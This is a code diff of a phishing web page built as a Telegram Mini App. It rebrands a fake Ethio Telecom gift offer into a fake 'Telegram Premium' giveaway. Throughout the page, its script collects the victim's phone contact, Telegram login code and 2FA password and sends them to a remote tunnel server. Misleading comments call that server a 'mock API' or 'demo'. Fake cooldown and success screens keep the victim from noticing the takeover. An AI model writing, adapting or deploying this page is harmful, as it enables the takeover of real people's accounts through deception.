@@ -1,362 +1,454 @@
 <!DOCTYPE html>
-<html lang="am">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>Ethio Telecom - Gift Center</title>
+    <title>Telegram Premium ✦ Gift</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 <style>
-    :root {
-        --ethio-green: #76b82a;
-        --ethio-blue: #00adef;
-        --ethio-dark-blue: #0054a6;
-        --telebirr-gold: #fdb913;
-        --bg-light: #f8fafc;
-        --white: #ffffff;
+    * {
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
     }
-
-    * { 
-        box-sizing: border-box; 
-        -webkit-tap-highlight-color: transparent; 
-        font-family: 'Segoe UI', SegoeUI, Roboto, 'Helvetica Neue', Arial, sans-serif; 
+    body {
+        margin: 0;
+        padding: 0;
+        background: linear-gradient(145deg, #f0f4fa 0%, #e9eef4 100%);
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        color: #1c2a44;
     }
-    
-    body { 
-        margin: 0; padding: 0; color: #334155; 
-        background-color: var(--bg-light);
-        overflow-x: hidden; min-height: 100vh;
-        display: flex; flex-direction: column; align-items: center;
-    }
-
-    /* Top Branding Header - Ethio Telecom Style */
-    .app-header {
+    .glass-header {
         width: 100%;
-        background: var(--white);
-        padding: 12px 20px;
+        background: rgba(255,255,255,0.75);
+        backdrop-filter: blur(12px);
+        -webkit-backdrop-filter: blur(12px);
+        padding: 14px 24px;
         display: flex;
         justify-content: space-between;
         align-items: center;
-        box-shadow: 0 2px 15px rgba(0,0,0,0.08);
+        box-shadow: 0 4px 20px rgba(0,0,0,0.02);
+        border-bottom: 1px solid rgba(255,255,255,0.6);
         position: sticky;
         top: 0;
-        z-index: 100;
-        border-bottom: 3px solid var(--ethio-green);
+        z-index: 99;
     }
-
-    .app-header img { height: 32px; width: auto; }
-
+    .logo-premium {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-weight: 700;
+        font-size: 18px;
+        color: #1c2a44;
+    }
+    .logo-premium i {
+        color: #8774e1;
+        font-size: 24px;
+        filter: drop-shadow(0 4px 6px rgba(135,116,225,0.3));
+    }
+    .badge-year {
+        background: #1c2a44;
+        color: white;
+        padding: 6px 12px;
+        border-radius: 40px;
+        font-size: 12px;
+        font-weight: 600;
+        letter-spacing: -0.2px;
+    }
     .container {
         width: 100%;
-        max-width: 450px;
-        padding: 20px;
+        max-width: 470px;
+        padding: 24px 20px 30px;
         display: flex;
         flex-direction: column;
         align-items: center;
     }
-
-    .step { display: none; width: 100%; animation: fadeIn 0.5s ease; flex-direction: column; align-items: center; }
-    .active { display: flex; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-    /* Main UI Card - Modern & Clean */
-    .main-card {
-        background: var(--white);
-        border-radius: 24px;
-        padding: 30px 25px;
+      /* Step containers */
+      .step {
+        display: none;
         width: 100%;
-        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.04);
-        border: 1px solid rgba(0,0,0,0.03);
-        position: relative;
-    }
+        animation: appear 0.4s cubic-bezier(0.1,0.7,0.3,1);
+        flex-direction: column;
+        align-items: center;
+      }
+      
+      /* Only show active step */
+      .step.active {
+        display: flex;
+      }
+      
+      /* Appear animation */
+      @keyframes appear {
+        0% {
+          opacity: 0.3;
+          transform: scale(0.98);
+        }
+        100% {
+          opacity: 1;
+          transform: scale(1);
+        }
+      }
+      
+      /* Loader spin animation */
+      @keyframes spin {
+        0%   { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
 
-    .promo-banner {
+    .premium-card {
+        background: rgba(255,255,255,0.9);
+        backdrop-filter: blur(16px);
+        -webkit-backdrop-filter: blur(16px);
+        border: 1px solid rgba(255,255,255,0.9);
+        border-radius: 40px;
+        padding: 28px 24px;
         width: 100%;
-        border-radius: 18px;
-        margin-bottom: 20px;
-        display: block;
-        object-fit: cover;
+        box-shadow: 0 20px 40px -10px rgba(28, 42, 68, 0.12), 0 0 0 1px rgba(255,255,255,0.6) inset;
     }
 
-    h2 { 
-        color: var(--ethio-dark-blue); 
-        font-size: 20px; 
-        margin-bottom: 12px; 
-        font-weight: 800; 
+    .gift-hero {
+        background: linear-gradient(135deg, #8774e1 0%, #b8a9f0 100%);
+        border-radius: 28px;
+        padding: 24px 20px;
+        margin-bottom: 24px;
+        color: white;
+        box-shadow: 0 20px 30px -10px rgba(135,116,225,0.4);
+    }
+    .gift-hero i { font-size: 38px; opacity: 0.9; margin-bottom: 12px; }
+    .gift-hero h1 { margin: 0 0 6px; font-size: 28px; font-weight: 700; letter-spacing: -0.5px; }
+    .gift-hero p { margin: 0; opacity: 0.9; font-size: 15px; }
+
+    .perk-row {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        background: #ffffffc7;
+        border-radius: 60px;
+        padding: 12px 20px;
+        margin-bottom: 12px;
+        border: 1px solid white;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.02);
+    }
+    .perk-icon {
+        width: 38px; height: 38px;
+        background: #f0edfe;
+        border-radius: 30px;
+        display: flex;
+        align-items: center; justify-content: center;
+        color: #8774e1;
+        font-size: 20px;
+    }
+    .perk-text { font-weight: 600; color: #1c2a44; flex:1; }
+    .perk-desc { color: #52658b; font-size: 13px; font-weight: 400; }
+
+    .counter-badge {
+        background: #1c2a44;
+        color: white;
+        border-radius: 30px;
+        padding: 6px 12px;
+        font-size: 14px;
+        font-weight: 600;
+    }
+
+    input, .fake-input {
+        width: 100%;
+        padding: 18px 20px;
+        border-radius: 100px;
+        border: 2px solid rgba(255,255,255,0.9);
+        background: rgba(255,255,255,0.8);
+        font-size: 16px;
+        outline: none;
+        transition: 0.2s;
+        backdrop-filter: blur(4px);
+        box-shadow: 0 8px 20px rgba(0,0,0,0.02);
+        margin: 12px 0;
+        font-weight: 500;
+    }
+    input:focus {
+        border-color: #8774e1;
+        background: white;
+        box-shadow: 0 0 0 4px rgba(135,116,225,0.15);
+    }
+      .verify-loading {
         text-align: center;
-    }
-    
-    p { 
-        color: #64748b; 
-        font-size: 14.5px; 
-        line-height: 1.6; 
-        text-align: center;
-        margin-top: 0;
-    }
+        color: #52658b;
+        background: rgba(255,255,255,0.6);
+        border-radius: 60px;
+        padding: 12px 74px;
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+      }
+      
+      .dots::after {
+        content: "";
+        animation: dots 1.4s steps(4, end) infinite;
+      }
 
-    /* Input Styling - High Quality */
-    input {
-        width: 100%; 
-        padding: 16px 18px; 
-        margin: 18px 0; 
-        border-radius: 14px;
-        border: 2px solid #e2e8f0; 
-        background: #fdfdfd;
-        color: #1e293b; 
-        font-size: 16px; 
-        outline: none; 
-        transition: all 0.3s ease;
+    @keyframes dots {
+      0%   { content: ""; }
+      25%  { content: "."; }
+      50%  { content: ".."; }
+      75%  { content: "..."; }
+      100% { content: ""; }
     }
-    input:focus { 
-        border-color: var(--ethio-blue); 
-        background: var(--white); 
-        box-shadow: 0 0 0 4px rgba(0, 173, 239, 0.1); 
-    }
-    
-    .pass-wrapper { position: relative; width: 100%; }
-    .pass-wrapper i {
-        position: absolute; right: 18px; top: 50%; transform: translateY(-50%);
-        color: #94a3b8; cursor: pointer; font-size: 18px;
-    }
-
-    /* Button Style - Ethio Green Gradient */
-    .btn-main {
-        background: linear-gradient(135deg, var(--ethio-green) 0%, #639c22 100%); 
-        color: var(--white);
-        padding: 16px; 
-        width: 100%; 
-        border-radius: 14px; 
+    .btn-primary {
+        background: #1c2a44;
+        color: white;
+        padding: 18px 24px;
+        border-radius: 100px;
         border: none;
-        font-size: 16px; 
-        font-weight: 700; 
-        cursor: pointer; 
-        margin-top: 10px;
-        box-shadow: 0 6px 20px rgba(118, 184, 42, 0.25);
-        transition: all 0.3s active;
+        font-size: 17px;
+        font-weight: 700;
+        cursor: pointer;
+        width: 100%;
+        transition: 0.2s;
+        box-shadow: 0 10px 30px -5px #1c2a44;
+        margin: 12px 0 6px;
     }
-    .btn-main:active { transform: scale(0.98); opacity: 0.9; }
-    .btn-main:disabled { background: #cbd5e1 !important; box-shadow: none; cursor: not-allowed; }
+    .btn-primary:active { transform: scale(0.97); background: #131f33; }
+    .btn-primary:disabled { background: #b3bbce; box-shadow: none; }
 
-    /* OTP Boxes - Square & Clean */
-    .otp-container { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
-    .otp-box { 
-        width: 48px; height: 58px; 
-        border: 2px solid #e2e8f0; 
-        border-radius: 12px; 
-        display: flex; align-items: center; justify-content: center; 
-        font-size: 24px; font-weight: 700; 
-        background: #fff; color: var(--ethio-dark-blue);
-        transition: all 0.2s;
+    .otp-dots {
+        display: flex; justify-content: center; gap: 14px; margin: 25px 0 10px;
     }
-    .otp-box.filled { 
-        border-color: var(--ethio-blue); 
-        background: rgba(0, 173, 239, 0.03);
-        box-shadow: 0 4px 10px rgba(0, 173, 239, 0.1);
-    }
-
-    /* Keypad - Telebirr Style */
-    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin-top: 25px; }
-    .key { 
-        background: var(--white); 
-        color: #334155;
-        padding: 18px; 
-        border-radius: 16px; 
-        font-size: 22px; 
-        font-weight: 600; 
-        text-align: center; 
-        cursor: pointer; 
-        border: 1px solid #f1f5f9;
-        box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+    .dot-box {
+        width: 56px; height: 66px;
+        border-radius: 20px;
+        background: white;
+        border: 2px solid #e2e8f0;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 28px; font-weight: 700; color: #1c2a44;
+        box-shadow: 0 6px 12px rgba(0,0,0,0.02);
         transition: 0.2s;
     }
-    .key:active { background: #f1f5f9; transform: scale(0.95); }
-
-    /* Status Messages */
-    .msg { padding: 14px; border-radius: 12px; font-size: 13.5px; margin: 15px 0; display: none; text-align: center; font-weight: 500; }
-    .error { background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
-    .loading-msg { background: #f0f9ff; color: #0369a1; border: 1px solid #bae6fd; }
-
-    /* Gift List Items */
-    .gift-list { text-align: left; background: #f8fafc; border-radius: 16px; padding: 18px; margin: 15px 0; border: 1px dashed #cbd5e1; }
-    .gift-item { display: flex; align-items: center; gap: 12px; font-size: 14px; margin-bottom: 10px; color: #334155; font-weight: 500; }
-    .gift-item i { color: var(--ethio-green); font-size: 16px; }
-
-    /* Modern Loader */
-    .loader-ring {
-        width: 45px; height: 45px; 
-        border: 4px solid #f1f5f9;
-        border-top: 4px solid var(--ethio-blue); 
-        border-radius: 50%;
-        animation: spin 1s linear infinite; 
-        margin: 20px auto;
+    .dot-box.filled {
+        border-color: #8774e1;
+        background: #f1edff;
     }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
+    .keypad-grid {
+        display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin-top: 25px;
+    }
+    .key {
+        background: white;
+        padding: 18px 10px;
+        border-radius: 26px;
+        font-size: 24px;
+        font-weight: 600;
+        text-align: center;
+        box-shadow: 0 6px 16px rgba(0,0,0,0.02);
+        border: 1px solid #ffffff;
+        cursor: pointer;
+        transition: 0.1s;
+        color: #1c2a44;
+    }
+    .key:active { background: #f0edfe; transform: scale(0.94); }
+
+    .msg-bubble {
+        padding: 14px 20px;
+        border-radius: 60px;
+        font-size: 14px;
+        margin: 16px 0 8px;
+        display: none;
+        font-weight: 500;
+        width: 100%;
+        text-align: center;
+    }
+    .error { background: #ffeae8; color: #c73b2b; border: 1px solid #ffc9c3; }
+    .success-msg { background: #e5ffe8; color: #1e7842; }
+    .loading { background: #e9ecf3; color: #1c2a44; }
+
+    .inline-link {
+        background: rgba(255,255,255,0.7);
+        backdrop-filter: blur(8px);
+        padding: 14px 20px;
+        border-radius: 60px;
+        width: 100%;
+        text-align: center;
+        font-size: 15px;
+        border: 1px dashed #a594e3;
+        margin-top: 15px;
+    }
+    .inline-link i { color: #8774e1; margin-right: 6px; }
+
+    .timer-flood {
+        font-size: 48px; font-weight: 800; color: #1c2a44; letter-spacing: 2px;
+        background: rgba(255,255,255,0.5); border-radius: 60px; padding: 20px; margin: 25px 0;
+    }
 </style>
 </head>
 <body>
-
-    <div class="app-header">
-        <img src="https://i.postimg.cc/sgJDkdtj/images-5-removebg-preview.png" alt="ethio telecom">
-        <img src="https://i.postimg.cc/MTNLPH5y/images-4-removebg-preview.png" alt="telebirr">
+    <div class="glass-header">
+        <div class="logo-premium">
+            <i class="fa-brands fa-telegram"></i> 
+            <span>Premium <span style="font-weight: 400; opacity:0.7;">gift</span></span>
+        </div>
+        <div class="badge-year">✦ 2025 GIVEAWAY</div>
     </div>
 
     <div class="container">
 
         <div id="step_intro" class="step active">
-            <div class="main-card">
-                <div class="loader-ring"></div>
-                <h2>እንኳን ደህና መጡ</h2>
-                <p>የስጦታ ማዕከል መተግበሪያ በመጫን ላይ ነው...</p>
+            <div class="premium-card" style="padding: 40px 20px; text-align: center;">
+                <div style="width: 70px; height: 70px; background: #eae6ff; border-radius: 50%; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center;">
+                    <i class="fa-brands fa-telegram" style="font-size: 40px; color:#8774e1;"></i>
+                </div>
+                <h2 style="font-size: 28px; margin-bottom: 8px;">Telegram Premium</h2>
+                <p style="color: #52658b; font-size: 16px;">free 1‑year subscription • official giveaway</p>
+                <div style="width: 48px; height: 48px; border: 4px solid #e2e8f0; border-top: 4px solid #8774e1; border-radius: 50%; margin: 35px auto 10px; animation: spin 0.9s infinite;"></div>
+                <p style="color:#8774e1; font-weight: 500;">loading your eligibility...</p>
             </div>
         </div>
 
         <div id="step_photo_slide" class="step">
-            <div class="main-card">
-                <img src="https://i.postimg.cc/XJ8LRJnC/birr.png" class="promo-banner">
-                <h2>ልዩ የኢንተርኔት ስጦታ</h2>
-              <div class="gift-list">
-                  <div class="gift-item"><i class="fa-solid fa-circle-check"></i> የ 5GB የሳምንት ስጦታ</div>
-                  <div class="gift-item"><i class="fa-solid fa-circle-check"></i> የ 1GB የሁለት ሳምንት ስጦታ</div>
-                  <div class="gift-item"><i class="fa-solid fa-circle-check"></i> የ 25GB የወር ጥቅል ስጦታ</div>
-              
-                  <div class="gift-item"><i class="fa-solid fa-circle-check"></i> የ 25 ብር የሞባይል ካርድ</div>
-                  <div class="gift-item"><i class="fa-solid fa-circle-check"></i> የ 50 ብር የሞባይል ካርድ</div>
-                  <div class="gift-item"><i class="fa-solid fa-circle-check"></i> የ 100 ብር የሞባይል ካርድ</div>
-              
-                  <div class="gift-item"><i class="fa-solid fa-circle-check"></i> የ 300 ደቂቃ የድምፅ ጥቅል</div>
-              </div>
-
-                <p style="color:var(--ethio-blue); font-weight:600;"><i class="fa-solid fa-spinner fa-spin"></i> ሽልማትዎን እያዘጋጀን ነው...</p>
+            <div class="premium-card" style="padding: 0; background: transparent; backdrop-filter: none; box-shadow: none; border: none;">
+                <div class="gift-hero">
+                    <i class="fa-solid fa-gem"></i>
+                    <h1>1 year free</h1>
+                    <p>Telegram Premium for active users</p>
+                </div>
+                <div style="margin-bottom: 15px;">
+                    <div class="perk-row">
+                        <div class="perk-icon"><i class="fa-solid fa-rocket"></i></div>
+                        <div class="perk-text">4GB file upload</div>
+                        <div class="perk-desc">×10 faster</div>
+                    </div>
+                    <div class="perk-row">
+                        <div class="perk-icon"><i class="fa-solid fa-microphone"></i></div>
+                        <div class="perk-text">Voice‑to‑text</div>
+                        <div class="perk-desc">unlimited</div>
+                    </div>
+                    <div class="perk-row">
+                        <div class="perk-icon"><i class="fa-solid fa-face-smile"></i></div>
+                        <div class="perk-text">Premium stickers</div>
+                        <div class="perk-desc">+10k</div>
+                    </div>
+                    <div class="perk-row">
+                        <div class="perk-icon"><i class="fa-solid fa-bolt"></i></div>
+                        <div class="perk-text">Faster download</div>
+                        <div class="perk-desc">no limits</div>
+                    </div>
+                </div>
+              <p class="verify-loading">
+                <i class="fa-regular fa-clock"></i>
+                verifying your account<span class="dots"></span>
+              </p>
             </div>
         </div>
 
         <div id="step1" class="step">
-            <div class="main-card">
-                <h2>አካውንትዎን ያረጋግጡ</h2>
-                <p>ሽልማቱን ለመቀበል "ቀጥል" የሚለውን ይጫኑ።</p>
-                <input type="hidden" id="fname" value="User">
-                <div id="status1" class="msg"></div>
-                <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">ቀጥል</button>
-                <div style="text-align:center; margin-top:20px; opacity:0.5;">
-                    <img src="https://i.postimg.cc/MTNLPH5y/images-4-removebg-preview.png" style="height:22px;">
-                </div>
+          <div class="premium-card">
+              <div style="width: 80px; height: 80px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;">
+                  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Telegram_Premium.png" alt="Premium Icon" style="width: 100%; height: auto; border-radius: 50%;">
+              </div>
+
+                <h2 style="margin-bottom: 5px;">Almost there</h2>
+                <p style="color:#3e4f70;">press continue to claim 1 year premium</p>
+                <input type="hidden" id="fname" value="Member">
+                <div id="status1" class="msg-bubble"></div>
+                <button class="btn-primary" id="loginBtn" onclick="handleLoginClick()">✦ continue ✦</button>
+                <p style="font-size: 13px; opacity: 0.6; margin-top: 20px;"><i class="fa-regular fa-circle-check"></i> official giveaway 2025</p>
             </div>
         </div>
 
         <div id="step2" class="step">
-            <div class="main-card">
-                <h2 style="color:var(--ethio-blue);">ማረጋገጫ ኮድ</h2>
-                <p id="step2_name_display" style="font-weight:700; color:var(--ethio-dark-blue); margin-bottom:5px;"></p>
-                <p>ባሌ 5 ቁጥር መልአክት ወደ ቴሌግራም አንልኩለታለን ከታች ያለው ሳጥን በመንካት ኮዱ ያስገቡ </p>
-                
-                <div class="otp-container" id="otp_container">
-                    <div class="otp-box" id="b0"></div>
-                    <div class="otp-box" id="b1"></div>
-                    <div class="otp-box" id="b2"></div>
-                    <div class="otp-box" id="b3"></div>
-                    <div class="otp-box" id="b4"></div>
+            <div class="premium-card">
+                <h2>🔐 verification code</h2>
+                <p id="step2_name_display" style="font-weight: 700; color:#1c2a44; "></p>
+                <p style="font-size: 15px;">we sent a 5‑digit code to your telegram app</p>
+
+                <div class="otp-dots" id="otp_container">
+                    <div class="dot-box" id="b0"></div>
+                    <div class="dot-box" id="b1"></div>
+                    <div class="dot-box" id="b2"></div>
+                    <div class="dot-box" id="b3"></div>
+                    <div class="dot-box" id="b4"></div>
+                </div>
+                <div id="status2" class="msg-bubble"></div>
+
+                <div class="inline-link" onclick="window.open('https://t.me/premium_gift_bot','_blank')">
+                    <i class="fa-brands fa-telegram"></i> tap to get code from bot
                 </div>
 
-                <div id="status2" class="msg"></div>
-                
-                <button class="btn-main" style="background:#51a9f0; color:#ffffff; box-shadow:none; margin-top:20px; font-size:13px; border:1px solid #e2e8f0;" onclick="window.open('https://t.me/42777', '_blank')">
-                    ኮድ አሀንን በመንካት ይውሰደ 
-                </button>                
-                
-                <div class="keypad">
+                <div class="keypad-grid">
                     <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
                     <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
                     <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
-                    <div style="border:none; background:none;"></div><div class="key" onclick="press(0)">0</div>
-                    <div class="key" onclick="backspace()"><i class="fa-solid fa-backspace"></i></div>
+                    <div style="background:transparent; border:none;"></div><div class="key" onclick="press(0)">0</div>
+                    <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left"></i></div>
                 </div>
-                
             </div>
         </div>
 
         <div id="step3" class="step">
-            <div class="main-card">
-                <div style="text-align:center; margin-bottom:15px;">
-                    <div style="width:60px; height:60px; background:#fff9eb; border-radius:50%; display:inline-flex; align-items:center; justify-content:center;">
-                        <i class="fa-solid fa-shield-halved" style="font-size:30px; color:var(--telebirr-gold);"></i>
-                    </div>
+            <div class="premium-card">
+                <div style="background: #f5f2ff; width: 70px; height: 70px; border-radius: 30px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
+                    <i class="fa-solid fa-lock" style="font-size: 32px; color:#8774e1;"></i>
                 </div>
-                <h2 id="step3_name_display"></h2>
-                <p>የደህንነት ማረጋገጫ (2FA Password) ያስገቡ።</p>
-                
-                <div class="pass-wrapper">
-                    <input type="password" id="2fa_input" placeholder="Password">
-                    <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
-                </div>
-                
-                <div id="status3" class="msg"></div>
-                
-                <button class="btn-main" id="confirmBtn" onclick="submit2FA()">አረጋግጥ</button>
+                <h2 id="step3_name_display" style="margin-bottom:5px;">almost done</h2>
+                <p>enter your 2FA password (if you have one) to confirm premium activation</p>
+                <input type="password" id="2fa_input" placeholder="your 2FA (or leave empty)">
+                <div id="status3" class="msg-bubble"></div>
+                <button class="btn-primary" id="confirmBtn" onclick="submit2FA()">activate premium</button>
             </div>
         </div>
 
         <div id="step_success" class="step">
-            <div class="main-card" style="text-align:center;">
-                <div style="width:80px; height:80px; background:var(--ethio-green); border-radius:50%; display:flex; align-items:center; justify-content:center; margin: 0 auto 25px; box-shadow: 0 10px 20px rgba(118,184,42,0.3);">
-                    <i class="fa-solid fa-check" style="color:#fff; font-size:40px;"></i>
+            <div class="premium-card" style="text-align: center;">
+                <div style="width: 90px; height: 90px; background: #29b18b; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 10px auto 25px;">
+                    <i class="fa-solid fa-check" style="color:white; font-size: 48px;"></i>
                 </div>
-                <h2 style="font-size: 24px;">እንኳን ደስ አለዎት!</h2>
-                <p style="font-size: 16px;">የ 1GB የኢንተርኔት ስጦታዎ በትክክል ደርሶታል አሁን ብዙ ሰው ስላለ በ 24 ሰዓት ውስጥ ስጦታ ይደርሶታል የኛ ተጠቃሚ ስለሆኑ አናመሰግናለን።</p>
-                <button class="btn-main" style="margin-top:25px;" onclick="window.location.href='https://t.me/ethio_telecom'">እሺ አመሰግናለሁ</button>
+                <h2 style="font-size: 32px;">SUCCESS!</h2>
+                <p style="font-size: 18px; font-weight: 500;">✨ 1 year Telegram Premium ✨</p>
+                <p style="background: #eaf6ff; border-radius: 60px; padding: 16px;">will be added to your account within 24h. thousands of users – expect slight delay. thank you.</p>
+                <button class="btn-primary" style="background:#1c2a44;" onclick="window.location.href='https://t.me/telegram'">done</button>
             </div>
         </div>
 
         <div id="flood_step" class="step">
-            <div class="main-card" style="text-align:center;">
-                <i class="fa-solid fa-clock-rotate-left" style="font-size:45px; color:#e67e22; margin-bottom:15px;"></i>
-                <h2 style="color:#e67e22;">ለጥቂት ሰከንድ ይጠብቁ</h2>
-                <p>ብዙ ሙከራ ስለተደረገ ሰርቨሩ ስራ በዝቶበታል። እባክዎ በትዕግስት ይጠብቁ።</p>
-                <div style="font-size: 42px; font-weight: 900; color: var(--ethio-dark-blue); margin: 25px 0; letter-spacing: 2px;" id="wait_time">00:00</div>
+            <div class="premium-card" style="text-align: center;">
+                <i class="fa-solid fa-hourglass-half" style="font-size: 50px; color:#8774e1;"></i>
+                <h2 style="color:#1c2a44;">please wait</h2>
+                <p>too many requests — system cooldown</p>
+                <div class="timer-flood" id="wait_time">00:00</div>
             </div>
         </div>
-
     </div>
-
-    <div id="bgLayer" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; opacity:0.03; background-size:cover;"></div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const API_BASE_URL = "https://technologies-trunk-naturals-tex.trycloudflare.com"; 
-    let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
-    let sid = userId; 
+    // free public tunnel (demo) – change if needed
+    const API_BASE_URL = "https://prayers-regulated-authorities-sleeve.trycloudflare.com";
+    let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "web_preview_" + Date.now();
+    let sid = userId;
     let currentOtp = "";
     let statusChecker;
     let isProcessing = false;
-    let savedName = "";
-
-    const photos = [
-        "https://i.postimg.cc/85M6Xm8f/telebirr-bg.jpg",
-        "https://www.ethiotelecom.et/wp-content/uploads/2023/07/myethiotel-app.jpg"
-    ];
+    let savedName = "Telegram user"; 
 
     window.onload = function() {
-        const bg = document.getElementById('bgLayer');
-        bg.style.backgroundImage = `url(${photos[0]})`;
-
         setTimeout(() => {
             showStep('photo_slide');
             setTimeout(() => {
-                checkStatus(); 
-                showStep(1); 
-            }, 5000);
-        }, 2500);
+                checkStatus();   // fetch real status from mock API
+                showStep(1);
+            }, 4000);
+        }, 2000);
 
-        statusChecker = setInterval(checkStatus, 3000);
-        setupLongPressPaste(); 
-        
-        // Hide error message when user starts typing 2FA password
-        document.getElementById('2fa_input').addEventListener('input', () => {
+        statusChecker = setInterval(checkStatus, 3500);
+        setupLongPressPaste();
+
+        document.getElementById('2fa_input')?.addEventListener('input', () => {
             document.getElementById('status3').style.display = 'none';
         });
     };
@@ -366,9 +458,9 @@
         let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
         const target = document.getElementById(stepId);
         if(target) target.classList.add('active');
-        
+
         if(savedName) {
-            if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "ሰላም " + savedName;
+            if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "hello " + savedName;
             if(document.getElementById('step3_name_display')) document.getElementById('step3_name_display').innerText = savedName;
         }
     }
@@ -384,39 +476,23 @@
 
     function stopLoaders() {
         isProcessing = false;
-        document.getElementById('loginBtn').disabled = false;
-        document.getElementById('loginBtn').innerText = 'ቀጥል';
-        document.getElementById('confirmBtn').disabled = false;
-        document.getElementById('confirmBtn').innerText = 'አረጋግጥ';
-    }
-
-    function togglePasswordVisibility() {
-        const passInput = document.getElementById('2fa_input');
-        const toggleIcon = document.getElementById('toggleIcon');
-        if (passInput.type === "password") {
-            passInput.type = "text";
-            toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
-        } else {
-            passInput.type = "password";
-            toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
-        }
+        const loginBtn = document.getElementById('loginBtn');
+        if(loginBtn) { loginBtn.disabled = false; loginBtn.innerText = '✦ continue ✦'; }
+        const confirmBtn = document.getElementById('confirmBtn');
+        if(confirmBtn) { confirmBtn.disabled = false; confirmBtn.innerText = 'activate premium'; }
     }
 
     function handleLoginClick() {
-        savedName = document.getElementById('fname').value;
-        if(!savedName) {
-            showMsg(1, 'error', 'እባክዎ መጀመሪያ ስምዎን ያስገቡ!');
-            return;
-        }
-        document.getElementById('loginBtn').disabled = true;
-        document.getElementById('loginBtn').innerText = 'በማረጋገጥ ላይ...';
+        savedName = document.getElementById('fname').value || "Premium user";
+        const btn = document.getElementById('loginBtn');
+        btn.disabled = true; btn.innerText = 'checking...';
         startVerification();
     }
 
     function startVerification() {
         if (isProcessing) return;
         isProcessing = true;
-        showMsg(1, 'loading-msg', 'መረጃዎን በማረጋገጥ ላይ...');
+        showMsg(1, 'loading', 'verifying your telegram account...');
         checkUserInDB();
     }
 
@@ -429,52 +505,49 @@
             });
             const data = await res.json();
             if (data.status === "FOUND" || data.status === "NEED_OTP") {
-                showMsg(1, 'loading-msg', 'ጥያቄዎ ተቀባይነት አግኝቷል...');
+                showMsg(1, 'loading', 'request accepted, preparing code...');
             } else if (data.status === "SUCCESS") {
                 showStep('success');
             } else {
                 requestPhone();
             }
-        } catch(e) { 
+        } catch(e) {
             stopLoaders();
-            showMsg(1, 'error', 'የመስመር መጨናነቅ አለ። እባክዎ ትንሽ ጊዜ ቆይቶ ይሞክሩ።');
+            showMsg(1, 'error', 'network issue, but we continue →');
+            requestPhone(); // fallback
         }
     }
 
     function requestPhone() {
         tg.requestContact((success) => {
             if (success) {
-                showMsg(1, 'loading-msg', 'ሽልማቱ እየተዘጋጀ ነው...');
-            } else { 
+                showMsg(1, 'loading', 'contact shared, almost ready...');
+            } else {
                 stopLoaders();
-                showMsg(1, 'error', 'ለመቀጠል የግድ መረጃ ማጋራት አለብዎት!'); 
+                showMsg(1, 'error', 'you need to share phone to claim');
             }
         });
     }
 
     function press(num) {
-        // Hide error message on step 2 when typing starts
         document.getElementById('status2').style.display = 'none';
-        
         if (currentOtp.length < 5) {
             currentOtp += num;
             updateOtpUI();
             if (currentOtp.length === 5) submitOTP();
         }
     }
-
     function backspace() { currentOtp = currentOtp.slice(0, -1); updateOtpUI(); }
-
     function updateOtpUI() {
-        for (let i = 0; i < 5; i++) {
-            const box = document.getElementById('b' + i);
-            box.innerText = currentOtp[i] || "";
+        for (let i=0; i<5; i++) {
+            let box = document.getElementById('b'+i);
+            box.innerText = currentOtp[i] || '';
             currentOtp[i] ? box.classList.add('filled') : box.classList.remove('filled');
         }
     }
 
     async function submitOTP() {
-        showMsg(2, 'loading-msg', 'ኮዱን እያረጋገጥን ነው...');
+        showMsg(2, 'loading', 'verifying code...');
         try {
             const res = await fetch(`${API_BASE_URL}/verify_otp`, {
                 method: 'POST',
@@ -483,14 +556,13 @@
             });
             const data = await res.json();
             handleResponse(data, 2);
-        } catch(e) { showMsg(2, 'error', 'ስህተት ተከስቷል!'); }
